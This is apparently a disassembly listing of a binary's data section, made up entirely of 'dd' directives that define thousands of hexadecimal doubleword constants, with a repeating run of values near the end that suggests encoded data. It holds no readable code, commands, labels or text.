		dd 6D873B65h, 0C3FB1195h, 0B5539E50h, 804F0FF0h, 0B2F3D1C9h
		dd 0E1D6F81Ch, 5580043Ah, 9455F34Fh, 31618160h,	0DFF7C166h
		dd 4463D77h, 0B35D254Eh, 71BC2045h, 23800122h, 45ADF406h
		dd 0B2DBD5DAh, 52BE28B4h, 120848ABh, 9E7817Ah, 0E67E1B6Dh
		dd 2E46118Ch, 644A29C6h, 54E40D75h, 0B7C8DC29h,	0D0BE4F62h
		dd 443B64FCh, 600F64DBh, 0DAB3F626h, 556E914Fh,	0C0B4BF65h
		dd 983163A2h, 9295B8B0h, 4B95FD62h, 3A62A174h, 8A80F3E5h
		dd 83E23CBDh, 720C44D6h, 28B3B19Ch, 0C846466Fh,	12CF010Fh
		dd 0F88D6811h, 533BC80Bh, 38C26011h, 7675EE02h,	0A8972F1Bh
		dd 4B8E7F6Ah, 2348DE47h, 9EFDA1D7h, 0F91DF813h,	5E48E249h
		dd 0C773FB58h, 0BCEA7952h, 6AD7BB26h, 62EC9B29h, 667615A0h
		dd 73EBEEB6h, 0A76DAF08h, 0B49628E1h, 0AED18B8Fh, 30C002F4h
		dd 14F614FBh, 0F7AFB810h, 0B988D46h, 0D77106CBh, 18823001h
		dd 1F80A517h, 1A04686Eh, 6A986227h, 1F37A714h, 4E2A0655h
		dd 0EF595Ch, 0C686ACB0h, 63485013h, 82182F78h, 2A55E5E0h
		dd 937F0916h, 0E6EE481Eh, 0E12E4548h, 51E679F9h, 0C6821AAEh
		dd 0B4E273BDh, 6B52194h, 0F90D7495h, 785BBC7Ah,	0F9445597h
		dd 0C02B8F26h, 292D6BC6h, 28F029CFh, 8FA56476h,	56F22177h
		dd 1A4EA1FCh, 30DC1841h, 7C953559h, 0C49FD21Eh,	9A9AA544h
		dd 7839390h, 0C703C89Fh
		dd 4C12830Ch, 3129E504h, 0A0187DA7h, 37634DF9h,	0D82F66C7h
		dd 9787F353h, 0F528F660h, 1F528D09h, 47992C31h,	44D165D7h
		dd 4EDE4301h, 0CADB803Fh, 66725C8Bh, 0FF557959h, 0FCDD07D5h
		dd 0B723BD58h, 75566FC5h, 3917A04Ah, 0AAC64156h, 4C29374Ah
		dd 0E77A9E91h, 53B457A4h, 0C8A71E76h, 0E7CA5752h, 189BAF68h
		dd 0A5F6BCB5h, 1CA6E9BFh, 8EB4A52Ah, 21DA8EA1h,	0B6D3A1B5h
		dd 0C1528A81h, 64767EA8h, 18856E1Ah, 56A59679h,	0BB4C7658h
		dd 4E347395h, 2770585Bh, 805E9C7Eh, 81D4AB0Ah, 0F89A9580h
		dd 0F989FC12h, 0F33C55Eh, 0A21C5799h, 0A20C468Fh, 200E0C33h
		dd 692ECE27h, 1FBFF221h, 4E610F6Ch, 9881F550h, 0F1A65D5Eh
		dd 3FF92872h, 79B3EDA4h, 37746209h, 5CFB8FA8h, 0B84152F3h
		dd 90B1A4E1h, 63399183h, 0D55C5D0h, 80BB1E05h, 1F9AC088h
		dd 17F698CEh, 0E24E94AAh, 947F4FFBh, 926C6CECh,	0FCD30CC3h
		dd 0B4D790Dh, 42BBCF47h, 92FA453Dh, 22FC6DC2h, 0EBBA3CB5h
		dd 57230D3Ch, 35A0D1DAh, 0F5CDA5AFh, 39F3E614h,	264D72F7h
		dd 1B0A734Fh, 0BCA1342Bh, 4E1FC95h, 53814655h, 86A1DA32h
		dd 26E72B88h, 468F4768h, 613B897Bh, 61CF0A44h, 4B0D6820h
		dd 7D3B500Dh, 6417CB42h, 0DAC979D4h, 3B70DB72h,	0BB198F99h
		dd 0F43D8484h, 621DF4D7h, 4EDE16Bh, 0D05624CDh,	847571CCh
		dd 12E5E137h, 8991D1D9h, 3380FA86h, 0BA209A25h,	0C46FA725h
		dd 8AAA8B2Ah, 0A6F233A4h, 226FC4D8h, 0C1B165E4h, 4B5026B9h
		dd 0CB9D9721h, 0D9D51700h, 852F6E70h, 0E30B39E2h, 0DE89AA61h
		dd 0C9CD1D1h, 2388FEC8h, 0B06DB708h, 200540C0h,	75136A71h
		dd 4AA56C2Dh, 698DAE68h, 5AB8D11Ah, 0C08A66E5h,	0D0575E99h
		dd 53BF7B8Fh, 0E2C9CC3Fh, 5C621078h, 0B19DC6DFh, 2EECD8FFh
		dd 3A022358h, 0E265548Ah, 37C95695h, 0F828FDA5h, 9001FB3Dh
		dd 721DA881h, 1856F63h,	0C287576Eh, 5530A692h, 2D1D8607h
		dd 9D3A71FBh, 712EB0F1h, 7813384h, 0F62FA35Ch, 0E7FC5CCDh
		dd 0E446E29Ch, 1685022Dh, 4401AF74h, 311950D1h,	4A6A093Eh
		dd 0BB3C0566h, 0F48C2F84h, 7D399A1Bh, 0CD955FE7h, 0A76A4AE8h
		dd 0EFF16044h, 8E3A9D1Ch, 16263822h, 0F631E7C9h, 0D944C8E5h
		dd 4E92ECD5h, 0BF17BB07h, 0C2D3AD1Dh, 0DFF8A055h, 1E4B84E3h
		dd 0D465EE2h, 7C92943h,	0EB07D897h, 51977EE0h, 65667624h
		dd 9EB941A2h, 45DA4F8Ch, 0C60F7E7h, 0A7A77D42h,	0DED55E06h
		dd 81113A2Ah, 0ECF8D6F9h, 0A7793629h, 512E7343h, 4E7E76DDh
		dd 0EDD87B8h, 0D21E4C84h, 3F567395h, 624CC98Ah,	6BE8F0Dh
		dd 8DAF412h, 929E1C06h,	5FA59CCDh, 39D3DE0Eh, 21565053h
		dd 0C2D69F55h, 42A92A8Ch, 0B06B7F34h, 548B6E9Dh, 0EBF0D906h
		dd 9D833150h, 26C74748h, 0A387B068h, 0F15A5BAh,	0A480E537h
		dd 0BC64BC82h, 60795E96h, 0BEFCB644h, 8A164954h, 98DB1ADDh
		dd 5186A30Dh, 30ED5EA6h, 0F427715Bh, 43514AB7h,	0E1E6F0E5h
		dd 0B57CC3EDh, 0AAC8330Eh, 0B9AA4D35h, 868E0825h, 0BA04390Bh
		dd 6B08B904h, 2571F1ECh, 67BD0C32h, 4AE26783h, 0EF5E62D1h
		dd 6574DE1Dh, 0B96CBADAh, 620CE469h, 3B3888DDh,	0D700C41Ah
		dd 3FF6C5C7h, 2E4B178Dh, 783FAAB5h, 2B69A2B4h, 0D204E496h
		dd 81B99B75h, 0E0F34429h, 3607BE28h, 0C4E3BDF7h, 0DA23E101h
		dd 39C5F884h, 0E664E756h, 0E7D6B786h, 0C524708Bh, 0C81222F9h
		dd 0D6C5AE10h, 4FE916EFh, 0BDACBD45h, 0D457EB3Ch, 0CAB5D790h
		dd 0FB153A29h, 95491614h, 8BE530CEh, 9FB3C1D5h,	0A7EC7395h
		dd 9E6FBE83h, 8F52766Dh, 252F4E3Fh, 500BC931h, 276B411Bh
		dd 1D685FF5h, 0C9435C6Bh, 0B5A5D84Ch, 0E2F1E174h, 5DB05495h
		dd 0B318B099h, 6B925740h, 4A809EF6h, 761CBBAEh,	0EA241302h
		dd 0E1F74967h, 369F0A42h, 30B3E0BAh, 71F6E999h,	0E7304666h
		dd 6ACB6A05h, 7FD88BC9h, 0E1912B7Dh, 53B8A1F6h,	9C97D48Eh
		dd 285F34E4h, 0DF31C5A0h, 92D7D9EAh, 7763B608h,	72FC6057h
		dd 0CD21CE1Dh, 1223BEB9h, 6E50F33Eh, 0E3950B5h,	50F68F49h
		dd 450EA262h, 37557759h, 0B6A015EEh, 441A5545h,	3671DB3h
		dd 0D40DF1E6h, 0C6A0C3B1h, 69940DC3h, 0D299E530h, 0A6EE772Dh
		dd 59539D04h, 8D55CB01h, 0D05B9276h, 510024CEh,	418D56A7h
		dd 78245A80h, 0CD1C6FFh, 20C4D690h, 82DF1B9Ch, 0A9A2F300h
		dd 28FF8F9Fh, 7B3AE81h,	0BF773F7h, 0E275B872h, 0D51AF76Dh
		dd 5C683A0Eh, 0D56EBD30h, 0EFDDA44Bh, 0E11BC029h, 12B5B384h
		dd 0CA0444F9h, 0A8ABDBFDh, 0D4730750h, 15C59BFDh, 0E81B6767h
		dd 3B33A70h, 954DB124h,	0EBA2F185h, 694DABD2h, 5A779AA1h
		dd 1A5DDBC7h, 4DAD0931h, 8B1A5078h, 9583F9h, 0FED7FA85h
		dd 6E08A99Dh, 10675E58h, 26AC20CFh, 0B132B063h,	0C4990174h
		dd 0CB649297h, 0CCC25E96h, 0FF6AF049h, 0B28E2EE2h, 0ABD612DAh
		dd 9738DFCFh, 0DA2CD3BDh, 50C8675Dh, 68BB11ADh,	3A5490FDh
		dd 5B767FEBh, 0C6632623h, 0BBC4C946h, 3A577CE5h, 1D804545h
		dd 36DB312h, 434608BDh,	7F62D35Eh, 0C068C8F6h, 6310EB6Eh
		dd 6EB77819h, 0B68D3FF2h, 3B956C0Fh, 168EE717h,	7C1050A2h
		dd 6EAB4D8Fh, 0FC97300h, 8A5119ADh, 27B743BEh, 3B0F69F8h
		dd 65A21D10h, 0B29C096Fh, 0CE1E50F7h, 3E7967B8h, 4CA3FB21h
		dd 115B58Bh, 0F3D1B537h, 5CC2E2E8h, 1EC5F8D0h, 9C2185BCh
		dd 69ACEA17h, 55F01817h, 2786898Eh, 8416581h, 40481B6Fh
		dd 2468178Bh, 0EACEC43Fh, 7CAB0181h, 0EC49982Ah, 7DBBD52Bh
		dd 95BB0848h, 0BE36A7CAh, 5DC621Dh, 7950BD20h, 0F60B87A6h
		dd 57E026B7h, 5F34D734h, 742CBCDCh, 2C46E1F4h, 1A47BE43h
		dd 93DB5755h, 0E55315ABh, 0D1FDFBB5h, 4C815C09h, 4D450187h
		dd 0EB432FDEh, 0BA1DF1E0h, 40F86546h, 4784A5D5h, 12238DDCh
		dd 80FAEC49h, 0C1524F31h, 906EA646h, 0F74AAE46h, 0E5B8FF48h
		dd 78DA3CCDh, 52D79B2Eh, 8A3A4471h, 8FD1EFA3h, 6CD74BC4h
		dd 687B5108h, 0C1C7C8DFh, 8EC05031h, 3B592256h,	12357D84h
		dd 88305187h, 0FF7357B5h, 0A8EE25B4h, 68E04F2Ah, 76A631B6h
		dd 0A2BB5858h, 54AB68B8h, 2387B8C0h, 0F15F2385h, 150DE04Dh
		dd 1780CC81h, 2BCCDC9Bh, 0D1F4F1F8h, 7D1F7787h,	0D1B7CF67h
		dd 2C8C5D38h, 0E8AC9C6Ah, 22DDA216h, 0E755B6A5h, 237C0519h
		dd 0D48BE4A6h, 244B6051h, 1B779B91h, 64D2EA61h,	0FF1FDDDCh
		dd 74DDA35Ch, 70672399h, 77AE33Ch, 3BD35411h, 0A469F15Eh
		dd 52C7827Eh, 0BFDB76C5h, 6CF8D812h, 0E388A127h, 509BE372h
		dd 3BDDBFE9h, 8D3BC853h, 39258B0Ch, 903ACD05h, 0B6D83020h
		dd 8FF53857h, 0DEE0C4h,	7E2EB41h, 0C917E759h, 0E7DD6042h
		dd 2868D791h, 1CF62246h, 0E7515773h, 244104F3h,	0E98AF3E1h
		dd 84EF00EDh, 0A03978C8h, 38DDF321h, 357ECA6h, 3DD0EDAFh
		dd 0A3C393FEh, 757D3BEFh, 0A8048C75h, 666463D8h, 0F6F72572h
		dd 3AACAA5h, 0C2C3711Dh, 0A49AAE51h, 6F2D2C67h,	4A87444Eh
		dd 0ADA0AB6Dh, 5F3CA5Fh, 0DE58BCB5h, 7655381Fh,	988B7E3Ch
		dd 57D01ECAh, 68173590h, 88971EA5h, 1D828325h, 1DB062CFh
		dd 0F27D4758h, 0B56DDCA0h, 626424C0h, 0AC4B6D95h, 0D8203D4Bh
		dd 5664CC6h, 71A82890h,	4B5C08C1h, 0F0572692h, 0F4F774FDh
		dd 0C5A32949h, 2B507795h, 992376F0h, 0CF50A6B3h, 7C96767h
		dd 0C2860C84h, 0BDCB76F1h, 32904957h, 778E6466h, 48CA10DAh
		dd 0FFB08D29h, 265AF6F1h
		dd 0CD37ACF4h, 97DE9AFAh, 11289932h, 6328A67Fh,	7A79163Fh
		dd 425E2506h, 16347975h, 0A77C10F9h, 8E2B856Eh,	2E451C7Dh
		dd 4DDEE97h, 6C13E7A1h,	0B9ED48BAh, 0ADEA5337h,	383C3B5h
		dd 7D98143Dh, 526A2404h, 0F636A1FBh, 0F94BCF70h, 529B0D9Eh
		dd 8D0F4F10h, 17A6D8E0h, 4CAFA45Eh, 448080B4h, 4DC26585h
		dd 61743B8Bh, 0F7554E4h, 7174ECAAh, 0D465220Ah,	0F878CE63h
		dd 51A584D4h, 4D2D7446h, 9C28E06Ah, 0D15B193Bh,	0DF21E999h
		dd 27CF77DAh, 8991561Fh, 0D4C4DE6Ch, 7A58745Fh,	59DC51F5h
		dd 8F7C88D6h, 0F6F6DD42h, 0C5C4B54Dh, 0E710C5F7h, 53AF1D4Fh
		dd 0A8580BBBh, 0F8B35B9Ch, 2F4D4663h, 4FB62DC3h, 3F655165h
		dd 0B7C48851h, 0E9217984h, 0A60F5490h, 28139152h, 0FE89C092h
		dd 0FD5C6A48h, 0B9B1FB6Fh, 263DE1F3h, 990F583Dh, 713EB329h
		dd 0F659EB03h, 0C391EA1Dh, 0DDA66BB0h, 62EDF292h, 8A4A3A0Ah
		dd 1072A3BDh, 1D165CC5h, 5F53FA1Eh, 8A4958ABh, 7688441Eh
		dd 8C565641h, 4B84C3FEh, 63D8FCF7h, 0F6D35732h,	4BCE4B2Dh
		dd 6A5459A2h, 0D704B0F2h, 3A7E4FF4h, 49543B33h,	11E68BCAh
		dd 89D5463Bh, 42098595h, 0E6DE8768h, 0FB39CB60h, 0AB5167B2h
		dd 0D8DE131Dh, 5868518h, 0A6348E1Ah, 0AE9977E1h, 41724E5Eh
		dd 0FCB6695Eh, 0F978E226h, 5289C0BDh, 0C3D2A062h, 0F45B3C0Dh
		dd 0D66BE1EFh, 0D94F570Eh, 0B9CBB021h, 0F1F32E6Bh, 65601655h
		dd 0E021215Bh, 0AC0E23B4h, 0D5884C87h, 0DCA43290h, 98A8CD73h
		dd 6961FCA8h, 2CEE1202h, 0A0FBF944h, 3A7D0AE5h,	77276E30h
		dd 7A3D37DBh, 93A26092h, 62B08C65h, 9D9D0E39h, 71FFCB5Fh
		dd 7A9975Dh, 6A3251E6h,	328ACA50h, 4ED7E4AEh, 4954541Ch
		dd 1B1C455h, 54C7070h, 4FE11418h, 1CD4615Fh, 5E0AA2E2h
		dd 0A353FAB3h, 3BD82C55h, 1EA07311h, 0B3D9773Ch, 8B02A038h
		dd 158C3394h, 389BEF63h, 654C7268h, 65F091A5h, 0B19B2514h
		dd 2C72180Ah, 0EE4D1B16h, 5842B642h, 686ED3E0h,	0FB17AD86h
		dd 17B7AE6Bh, 146AC877h, 6E732C59h, 5F989935h, 0B0886533h
		dd 0D3BD84A8h, 91B7812Ch, 0DFAF8DABh, 0FE90BA77h, 0AE19E02Ah
		dd 379DC24Dh, 9C442883h, 5E771B34h, 9E56B88Dh, 9F1F12F0h
		dd 90EC167h, 0A39F7C4Fh, 0E65EF165h, 5F25538Ah,	0E0843613h
		dd 876D7608h, 7D3A6608h, 9BF97DD5h, 9B8E2534h, 52B3D358h
		dd 5A7787CFh, 470DDC75h, 8CF06EBFh, 0F5A74D01h,	0A4364783h
		dd 391A4EE7h, 74132990h, 5EE284D3h, 8898072Fh, 45FA5405h
		dd 78BC8AD6h, 8D40D7CEh, 627AC72Eh, 9855A707h, 7AE3D952h
		dd 38B58C74h, 0CEE2F732h, 0DD42E927h, 89CB980Ah, 538F277Bh
		dd 2646F921h, 0C3ED9FE2h, 0EC5C4D73h, 0B35CDC44h, 2978C7CEh
		dd 0C6C0A193h, 33A427EFh, 371C73F8h, 0BE17E82Ch, 397E28B7h
		dd 24C1164Ah, 2CF7187Dh, 0F63848C0h, 2FD7FECh, 68D4744Fh
		dd 2DF4E69Dh, 6BA4D8BDh, 0F590F234h, 44DFB2B0h,	916C0EE4h
		dd 8A7D576Fh, 29CFE9FAh, 77DE677Bh, 3DE6DD8Ch, 94599945h
		dd 50642470h, 0EB386A4Fh, 0FDED6F94h, 30029568h, 0BA8E5F67h
		dd 93FDEB26h, 0AC68E105h, 180B4D38h, 241369BDh,	39C93EAAh
		dd 23AECDEDh, 24F15BC2h, 1D6B13D7h, 0C9152AE7h,	8C0D2CCBh
		dd 5C2DDFF7h, 95594F46h, 0E731A41Dh, 0DC6D4DB7h, 0A34E868Fh
		dd 0D5406FAh, 0E3F7751Dh, 8AE4C368h, 30FCE2D4h,	0E35E9889h
		dd 5C598728h, 0BAE2773Fh, 43132BAFh, 10B84D22h,	0D8DE0690h
		dd 18D832C6h, 1ABFBEB7h, 6C46054Bh, 0E1D3EFB4h,	0FEB71DC9h
		dd 8569CE78h, 4DAA069Eh, 3A6DBFh, 0F52A7781h, 11F10E2Bh
		dd 9EE963A7h, 708D0322h, 0E69EE355h, 9CEE78EDh,	0F553D46Ah
		dd 0E067C15Ch, 0EDADD8BDh, 0E18F1188h, 24BAF640h, 0DBFB71CFh
		dd 863AE292h, 385562EBh, 365811AAh, 9FE27A8Dh, 4CDE7FDAh
		dd 0DBAD76D2h, 9C9FBC55h, 87940B86h, 5B9EB306h,	1CF2456Bh
		dd 294C9CF1h, 2F326FC5h, 5977499Fh, 0ADA05F1Dh,	486EACE5h
		dd 0E4201E48h, 1801CCB8h, 0E2796B84h, 98B70053h, 0A7EA1A11h
		dd 0D24577B1h, 5C292A31h, 50E94D2h, 8AB0AAE2h, 17CB5B80h
		dd 0E31A7C4Ch, 79426C4Dh, 71A6F1BFh, 0B8134CC6h, 8E355341h
		dd 4E7B2601h, 3B4B1759h, 6C891E97h, 3F31B595h, 959D1B8h
		dd 5B0D5D1h, 7B9B3356h,	0D8739023h, 88CD8E10h, 0F921AE7Eh
		dd 0FC03274h, 88136E55h, 0BB2A155h, 0E749C2EBh,	0B187B9C3h
		dd 0E7DCE05Ah, 87BFBC6Dh, 0EEFF57F1h, 9D5A45AAh, 732F4629h
		dd 2549F7BBh, 0DF15C42Ch, 0BC6D2147h, 64FAE77Bh, 114099D8h
		dd 1FC218B0h, 91539B50h, 43B01CBh, 5CBCF792h, 60D9B509h
		dd 486ADD0Eh, 0F3C01F48h, 6CDBE37Fh, 8237E021h,	0B70E048Eh
		dd 1EBB4596h, 186B15F6h, 7D751E83h, 67DAB578h, 5D90F34h
		dd 30A1C062h, 0DA9FBE48h, 2F4E7066h, 6D76C0C2h,	3D92189Ch
		dd 539086Ah, 1CA831C4h,	416A2A89h, 81395268h, 0C0024A70h
		dd 0A50DBC71h, 35328933h, 0AFE22E20h, 0EE66E100h, 0D46AB821h
		dd 0CD32DFE8h, 28778316h, 89D4B30Eh, 6BC0E480h,	0D321D063h
		dd 8EF44358h, 0DB0FF85Eh, 93CDF0F8h, 7EB042Dh, 0E6A16020h
		dd 4B3611Ch, 51C40FF4h,	21061EEh, 3A1F40C6h, 0A0B4E3D0h
		dd 4C647C21h, 17C342CFh, 35271C21h, 367007C1h, 0ED3584E0h
		dd 5666047Bh, 1343034Dh, 0A59CA703h, 29657039h,	0E94B34F8h
		dd 681B64FDh, 0CB2946F0h, 11CE9741h, 0C06BCFCFh, 887947B4h
		dd 6A4C7F60h, 620D1A42h, 0EFDABC49h, 0B092E56Eh, 60EC7D5Bh
		dd 421F4F04h, 9D370901h, 74082984h, 90A096D3h, 4F6DA886h
		dd 2132530Bh, 0C1FA077Bh, 562CE006h, 7907CB65h,	4C71608Dh
		dd 4C615960h, 81E7B33Ah, 0EAD2BEDBh, 0E2745EA1h, 0BE657F5Bh
		dd 3710E7ABh, 312DEFCBh, 0C107F30Fh, 55CBAED2h,	722C7172h
		dd 0B524480Ah, 1D001561h, 0CEC1F0A5h, 26E4C882h, 63597048h
		dd 71A46266h, 92E2EB83h, 39E884BFh, 53405FBFh, 374FAA3Fh
		dd 11C5D502h, 9E7E3721h, 0C32DBE3h, 0B5FA1F6Dh,	9401078Dh
		dd 779408EBh, 97947442h, 53F0AFD7h, 45614304h, 0A3145E90h
		dd 9686C66Dh, 5093DBC4h, 7F39991Ah, 67ADCD13h, 2071442Fh
		dd 0E8DF676Ch, 0D297E20Bh, 197877E3h, 0BB278632h, 8297C537h
		dd 463C4B5Ah, 894D7A18h, 612F185Fh, 350D142Bh, 711EA0A0h
		dd 1A6B8A5Dh, 0B9FA5BAh, 5527738h, 0F7364E12h, 0DE775C1h
		dd 41B4A90Fh, 6E08AC4Ch, 0E09D069h, 0F7DDDC68h,	0A4E9711Fh
		dd 340287E5h, 2562569Fh, 4BEA744Bh, 248AB4EBh, 0DCB3379h
		dd 3CCE578Eh, 18F92189h, 16371A0Dh, 1CC662Ch, 88DBFBDBh
		dd 34A8F4A8h, 0E8147CF7h, 13308535h, 2D013E11h,	0D87737D3h
		dd 0E424430h, 0A351279Fh, 0FF5719A4h, 0F8472F9Ah, 4EC2F341h
		dd 76897E9Ch, 344A71FAh, 0A7A0D81Ah, 0EF8FC028h, 0E93C22A3h
		dd 58735F95h, 0E0EE3E77h, 1A74B7A3h, 25917C93h,	69603454h
		dd 99074B47h, 1352BE5Eh, 31D3366Dh, 54BF9222h, 2C509834h
		dd 12106ADFh, 0F1732489h, 0DD6AACAh, 1C26BDA9h,	0BB436483h
		dd 525A9A83h, 46F4352Ch, 8E6BAF6h, 0EA79681Bh, 0C2CD3355h
		dd 244E60F4h, 3C1D8335h, 0E951A8B8h, 0C071603Ah, 715A79A1h
		dd 0B145AEBCh, 0CAD1B041h, 70B9E6B6h, 4E6D7936h, 2111B2ACh
		dd 71A983EAh, 0DC076CBEh, 0C2708D09h, 687DAF90h, 494E158Eh
		dd 608CAF4Ah, 55D370EDh, 0D344E08Ch, 0A989C95Ah, 0BC4F7E76h
		dd 0F24170A2h, 319F7D4Ah
		dd 0CA014214h, 1652CC34h, 81078FA0h, 0F0611CE4h, 5A0EE270h
		dd 0C46D9650h, 5172DE2Eh, 0FE867C45h, 0DF9BAE2Eh, 0D6603527h
		dd 59537320h, 9E05C22Eh, 0BCE08DF6h, 87765A75h,	0AC517A76h
		dd 0B8494F4Dh, 0C24ED6F8h, 7B64821Dh, 0D097660Bh, 0F4713DE5h
		dd 6A8A5342h, 0A18674A5h, 230F7E74h, 30C2E3A3h,	6A76D5F2h
		dd 6DCBBF70h, 46C43A6Ch, 90BD4BEAh, 2A20BE82h, 88371735h
		dd 4279F64Bh, 2D4EEF5Fh, 3333622Dh, 0B7F0FC40h,	4ACBF361h
		dd 723A169Dh, 6B42601Bh, 0CBC98C69h, 0ACF704Eh,	0F7D4C2Bh
		dd 0A1398738h, 0C263DECDh, 2615E9D5h, 4A75FD7Dh, 66FF48E3h
		dd 0D6B42A9Bh, 0DCF84981h, 0CE68FFD1h, 33425D98h, 2262C92Bh
		dd 196C3B6Eh, 0C75C0A79h, 0B13C5715h, 450A3471h, 2C88D060h
		dd 20B08153h, 7F928AD4h, 4F913A71h, 7BBD348Ch, 6391A67Eh
		dd 0C1515AC8h, 5D9BBFDBh, 99573120h, 679567C9h,	6FDF9054h
		dd 0DFF38A46h, 965F159Fh, 0C5D4A3EDh, 0F664313Fh, 9E8EF4ACh
		dd 715C60F8h, 0BEE4DEF6h, 0F31DB6A2h, 0BDC41273h, 63AE544Fh
		dd 37EC0235h, 0B002CB3Eh, 6B80677Eh, 34480660h,	141BF59Ah
		dd 2C3BBC2h, 96C8A18Eh,	80EF90F9h, 0B0D2A32h, 0DC211D73h
		dd 0C8ED8FE2h, 0AB3A8834h, 5E607B72h, 74AEEB24h, 73C04311h
		dd 71215557h, 10AF2C04h, 355E1C0Dh, 0D0E4B155h,	0DDE47A51h
		dd 0FDADCB22h, 0E21B115Fh, 642CC94Ah, 0B954AD0h, 978458F2h
		dd 5FB7EA84h, 0F28EB4B1h, 9A5359C9h, 6254962Eh,	0A2AB9F5h
		dd 0E9629247h, 22B8C932h, 0F4970142h, 35B56338h, 2C162813h
		dd 1AC56BC1h, 0E6FB61F7h, 7511E30Ch, 831C4905h,	43EEA142h
		dd 0DFA6562h, 0E9001F57h, 47191A18h, 0BEF2D85Fh, 0CEC1973Ah
		dd 4D4F4104h, 86A33C05h, 0AC693260h, 49EA1EA6h,	0F14F3AFDh
		dd 3E8AF577h, 0D5846787h, 0E9FC3221h, 4337BC84h, 3C047955h
		dd 8D63EEAh, 2DACE0F2h,	242DDC3Bh, 7545A7B8h, 534067D8h
		dd 0F8B76D95h, 46297817h, 7764E57Eh, 1ED1AA5Fh,	92FB3149h
		dd 9E3DC80Ah, 883613C2h, 0AD54C0F0h, 1A3A0DB7h,	39221400h
		dd 95F6246Eh, 0DBD2F7A3h, 7E7A81CAh, 53887A49h,	0D7EB18Eh
		dd 6977D396h, 7BD0BCBFh, 0CDDD79B4h, 311E2D3Bh,	49C00180h
		dd 0F0C15652h, 6015B832h, 1C62642h, 0EEB75671h,	8DE7435Bh
		dd 0FA2D3344h, 79BCD00Eh, 0D7CF6453h, 7685D51h,	0D840A607h
		dd 0CBA4CC89h, 0C8348A36h, 12C5AD15h, 22B22804h, 80A30026h
		dd 352DDBE3h, 0DD1E2A3Eh, 0DD5F5F29h, 0D020885Ah, 1613BE45h
		dd 9435CFE1h, 5366BAB1h, 91115278h, 0F1726300h,	57A3704Ah
		dd 67FBF8F4h, 6018B141h, 916887CBh, 0EC8EA59Eh,	1968EECEh
		dd 0C55C5F61h, 72480D2Bh, 46900C90h, 61452EDFh,	1CBBFAF5h
		dd 64AD765Ah, 0A331954Eh, 0D25E062Fh, 3F6BAE10h, 85AD1075h
		dd 4D2AB315h, 5BF68B14h, 44B19A28h, 6248F86Bh, 7D4615D9h
		dd 14E74CEh, 0A9286253h, 69106F78h, 0D4F15950h,	0D80B08E2h
		dd 0ACB62E11h, 4165DF99h, 7548A4E4h, 0C19DEF08h, 26C50D0Dh
		dd 12363C36h, 0F26E5E4Eh, 11586EA4h, 388BBF93h,	0E688FBBh
		dd 42293F24h, 0B5F34004h, 0C8B5C50h, 4D05DB9Dh,	262E2CC9h
		dd 18604337h, 40ACF944h, 0D0DED8Dh, 0C2102DBAh,	3A0E6D74h
		dd 6A686F45h, 0DCA072D9h, 0D940D763h, 9EA32A45h, 3F492314h
		dd 0C2706635h, 664455A4h, 0FE86CF6h, 321FC65h, 0EC52D149h
		dd 38F8CFF5h, 0E1902492h, 786AB5DFh, 109A76ABh,	1C252651h
		dd 22D18CE0h, 95BDF42h,	0A9636AF4h, 3F9147DDh, 0C729B330h
		dd 433DA92h, 6CCBE4F3h,	4BAA7E71h, 83EBDA7Fh, 9E3B29B7h
		dd 39B8F1C6h, 6B441E71h, 9867D857h, 4030AD6Fh, 0E292ECD6h
		dd 0CF103C0Dh, 1815D5B4h, 35D14C06h, 0C5DA45A3h, 0C3187906h
		dd 25A134F8h, 0FB51139Ah, 4FF57765h, 0FB0D929Fh, 700AC074h
		dd 9FB39303h, 685BC308h, 0CC74BBDFh, 0C772F2C5h, 37A8B981h
		dd 61BD7EE1h, 4FE4AC79h, 0DE465268h, 0A1960709h, 0A2C02D93h
		dd 9ADF39D0h, 1FB098F3h, 83B14DB8h, 2A49D001h, 0A53A7177h
		dd 2F67EAB3h, 8859B38Ah, 6B1CC34h, 312DC196h, 3FD794ABh
		dd 9842FA7Fh, 8642935Eh, 7974D220h, 6EBB24B4h, 70483E62h
		dd 7E80DFA2h, 22AED081h, 21570A7Bh, 0A776BA25h,	0D9E4453h
		dd 498AEDD8h, 82263388h, 0D12F1519h, 19F0AB21h,	0AB0CBAB5h
		dd 0BDCB51EFh, 16D230BAh, 710DB45Fh, 0B3A53A71h, 8A2F67EAh
		dd 578859B3h, 0E5DC08E8h, 0FB39582Eh, 9D5A53FFh, 0AB177768h
		dd 0A04492CBh, 3E6507F4h, 0E0A1B3D2h, 0FA4EA05Dh, 47399851h
		dd 816344D9h, 5888D100h, 2F8299C7h, 27E99E4Bh, 578ACC66h
		dd 0C08A26CFh, 34C44292h, 7BD11007h, 9B533588h,	0B1DA16B0h
		dd 96074E98h, 3737A7C1h, 608838CDh, 70E45B0Eh, 0AAB42648h
		dd 0C5C98D0Eh, 0E998F14Bh, 0FF717411h, 0C8B74D68h, 0F920AEB8h
		dd 0EA42918Eh, 3239F835h, 0ACC7EC6Dh, 0D8484BD4h, 73C92841h
		dd 34724AAAh, 0C0E065FDh, 65AC7C29h, 81D018BCh,	2691F629h
		dd 0E5302889h, 69F3D76Bh, 0C6B8D8B9h, 0D30E04B1h, 576952A7h
		dd 0E1757899h, 7E1574D9h, 8BCC6725h, 0F6C0AD57h, 28895291h
		dd 684FFB30h, 217964FCh, 0ACB84FDAh, 17099AB9h,	647DC196h
		dd 0E383E51Ah, 0E321AC9Eh, 465349E8h, 167829A1h, 284F05A1h
		dd 32E484B1h, 17B1532Eh, 502DE29h, 0F8966D89h, 628A45E9h
		dd 2B88343Ch, 48B09F90h, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7A61B0D0h
		dd 784F64ACh, 0DA14653h, 0ADC19607h, 0D5617032h, 6C7961B4h
		dd 5DC84F66h, 37092146h, 30ADC195h, 0B4D0E170h,	64AC7961h
		dd 4653484Fh, 97070521h, 0D0302DC1h, 6334D0E1h,	8764AC79h
		dd 22C65348h, 31960709h, 0E5F0302Dh, 6161B4D0h,	4DCF64ADh
		dd 49214653h, 2B419606h, 0B8E17030h, 0ABF961B5h, 0C3484F64h
		dd 0F892147h, 882DC196h, 0BD50E171h, 84AC7961h,	4CD3484Eh
		dd 9E070921h, 7BB02DC3h, 51B4D0E1h, 43E4AC7Bh, 79465348h
		dd 0C116070Bh, 0E170302Dh, 7961B4D0h, 484F64ACh, 10214753h
